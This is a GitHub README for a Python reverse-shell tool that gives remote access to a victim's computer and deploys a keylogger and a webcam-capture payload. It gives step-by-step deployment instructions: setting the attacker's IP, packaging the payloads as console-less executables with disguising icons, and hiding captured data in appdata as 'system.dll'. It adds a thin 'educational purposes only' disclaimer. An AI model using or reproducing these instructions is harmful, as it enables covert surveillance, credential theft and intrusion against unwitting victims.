# Py-ReverseShell
A Reverse Shell, also known as a remote shell or "connect-back shell" is process used to gain access a victim's remote system by initiating a shell session. The Py-ReverseShell is a shell code written in python that is able to establish a remote connection and upload KeyLoggers and Camera Monitoring onto the Victims systems. Everything Above is for educational purposes only.

# How To Install
- git clone https://github.com/CuriousAvenger/Py-ReverseShell
- python3 RS-Server.py or RS-Client.py
- pyinstaller --onefile --noconsole -i <icon> <filename> -n <output.exe>

# How To Use
- A host is required to run `RS-Server.py`, while a victim connects
- Change the `IP` address in `RS-Client.py` to the server's address
- Use `ipconfig` or `ifconfig` to get the IP address of host machine.
- After client connect, type help to see available commands

# Additional Payloads
- Convert `CamCapture.py` and `Keylogger.py` into exe files using below code
- `pyinstaller --onefile --noconsole -i <icon> <filename> -n <output.exe>`
- Upload & run these payloads using `upload` & `start` features in shell
- All required information will be stored in appdata as `system.dll`

# Error Handling
- Make sure the two users are not from the same device, else shell will crash.
- Make sure victim and server are connected to same Wifi. Enable port forwarding otherwise.
- If you run into a forever loop use task manager to kill the python task.
- Make sure no other program uses the port `4444` or change it if it does
- Payloads by default are not initalized on purpose. Highly recommend to mess with them before using.
